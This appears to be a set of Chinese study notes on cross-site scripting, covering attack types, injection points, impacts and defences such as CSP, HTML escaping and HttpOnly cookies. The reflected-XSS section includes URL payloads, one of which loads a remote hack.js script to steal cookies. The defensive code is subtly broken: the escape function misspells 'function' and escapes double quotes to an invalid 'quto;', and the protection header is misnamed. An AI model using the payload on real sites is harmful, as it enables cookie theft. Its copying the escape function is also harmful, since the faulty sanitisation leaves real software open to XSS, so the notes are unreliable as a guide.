### XSS

Cross Site Scripting 跨站脚本攻击,
通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。

### 分类

- 反射型

  > url 参数直接注入

  ```javascript
    // alert尝试
    http://localhost:3000?from=<script>alert(123)</script>

    //获取cookie
    http://localhost:3000?from=<script src="http://localhost:4000/hack.js"></sript>
  ```

- 存储型
  > 存储到 DB 后读取时注入

### 注入点

- HTML 节点内容
- HTML 属性
- Javascript 代码
- 富文本

### 危害

- 获取页面数据
- 获取 Cookies
- 劫持前端逻辑
- 发送请求

### 常见防御手段

- 浏览器自带防御机制 `X-SS-Protection`

  > IE 提出的规则，最新的 Chrome 不生效。
  > 只对反射型（出现在 HTML 节点内容和属性中）生效

  > 0 禁止 XSS 过滤。
  > 1 启 XSS 过滤(通常浏览 是默认的)。 如果检测到跨站脚本攻击，浏览 将清除 (删除 安全的部分)。
  >
  > - 1; mode=block 启用 XSS 过滤。如果检测到攻击，浏览将不会清除页面，而且阻止页面加载。
  > - 1; report= (Chromium only) 启用 XSS 过滤。如果检测到跨站脚本攻击，浏览器将清除页面并使用 CSP report-uri 指令的功能发送违规报告。

- 内容安全策略 CSP `Content Security Policy`
  https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP

  > 是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括 XSS 和数据注入等攻击。
  > 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。

  ```javascript
  // 只允许内容来自站点的同一个源 (不包括其子域名)
  Content-Security-Policy: default-src 'self'

  // 只允许加载 HTTPS 协议图片
  Content-Security-Policy: img-src https://*

  // 不允许加载任何来源框架
  Content-Security-Policy: child-src 'none'

  ```

- 转义

  ```javascript
  fuction escapeHtml (str) {
    if(!str) return '';
    str = str.replace(/&/g, '&amp;');
    str = str.replace(/</g, '&lt;');
    str = str.replace(/>/g, '&gt;');
    str = str.replace(/"/g, 'quto;');
    str = str.replace(/'/g, '&#39;');

      return str;
  }
  ```

- 白名单

  - `npm i xss` https://github.com/leizongmin/js-xss/blob/master/README.zh.md

- HttpOnly Cookie
  > Web 应用程序在设置 cookie 时，将其属性设置为 HttpOnly, 可以避免该网页的 cookie 被客户端恶意 JavaScript 窃取。
